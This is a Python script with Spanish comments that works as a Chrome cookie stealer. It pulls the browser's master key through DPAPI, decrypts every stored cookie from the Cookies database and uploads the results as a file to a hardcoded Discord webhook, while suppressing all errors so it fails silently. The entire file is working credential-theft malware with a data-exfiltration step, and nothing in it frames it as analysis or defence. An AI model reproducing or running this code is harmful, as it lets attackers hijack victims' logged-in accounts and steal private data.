import os
import json
import base64
import sqlite3
import requests
from Crypto.Cipher import AES
import win32crypt # Solo funcionará al compilar/ejecutar en Windows

# --- CONFIGURACIÓN ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1497723001221939282/kono4mxKmfNnWPr-jsT3ogRmu2YXi2N4qprkEpvjVc3yGh6CckKHlZ9eLRLbJNRYQedc"

def get_master_key():
    path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # Eliminar prefijo DPAPI
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def grab_chrome_cookies():
    master_key = get_master_key()
    cookies_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    
    # Crear copia temporal para no bloquear el navegador
    if os.path.exists("temp_cookies"): os.remove("temp_cookies")
    import shutil
    shutil.copyfile(cookies_path, "temp_cookies")
    
    conn = sqlite3.connect("temp_cookies")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    cookies_data = ""
    for host, name, encrypted_value in cursor.fetchall():
        try:
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_value = decrypt_payload(cipher, payload)[:-16].decode()
            cookies_data += f"Domain: {host} | Name: {name} | Value: {decrypted_value}\n"
        except:
            continue
            
    conn.close()
    os.remove("temp_cookies")
    return cookies_data

# --- ENVÍO ---
def send_to_discord(data):
    # Si los datos son muy largos, se envían como archivo
    with open("cookies.txt", "w") as f:
        f.write(data)
    
    with open("cookies.txt", "rb") as f:
        requests.post(WEBHOOK_URL, files={"file": f}, data={"content": "Log de Cookies obtenido:"})
    os.remove("cookies.txt")

if __name__ == "__main__":
    try:
        data = grab_chrome_cookies()
        send_to_discord(data)
    except Exception as e:
        pass # Silencio total si hay error
